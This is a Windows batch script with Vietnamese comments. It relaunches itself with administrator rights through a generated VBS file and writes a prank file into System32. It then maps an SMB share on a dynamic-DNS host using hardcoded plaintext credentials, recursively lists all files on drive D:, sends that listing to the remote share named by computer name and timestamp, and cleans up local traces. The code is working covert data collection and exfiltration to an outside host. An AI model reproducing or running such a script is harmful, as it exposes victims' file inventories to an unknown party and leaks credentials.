set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
echo Hello Thuyen Thuyen > "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
rem del /f /q "C:\Windows\System32\WindowsPowerShell\hehehe.txt"


:: Lấy tên máy tính bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i

:: Lấy ngày và giờ hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
set DATE=%DATE:/=-%
set TIME=%TIME::=-%

:: Tạo file tên theo định dạng "%DeviceName%_%DATE%_%TIME%.txt"
set FileName=%DeviceName%_%DATE%_%TIME%.txt
set TempFilePath=%temp%\%FileName%

:: Liệt kê toàn bộ thư mục và file tại D:\ và ghi vào file tạm
dir "D:\" /s > "%TempFilePath%"

:: Di chuyển file đến vị trí chia sẻ mạng
net use \\minhtuan283.ddns.net\HDD /user:minhtuan283 Thienngan2002
move "%TempFilePath%" "\\minhtuan283.ddns.net\HDD\serial\listt\%FileName%"

:: Xóa file tạm và các biến tạm
if exist "%TempFilePath%" del "%TempFilePath%"
net use \\minhtuan283.ddns.net\HDD /delete
set DeviceName=
set DATE=
set TIME=
set FileName=
set TempFilePath=

exit
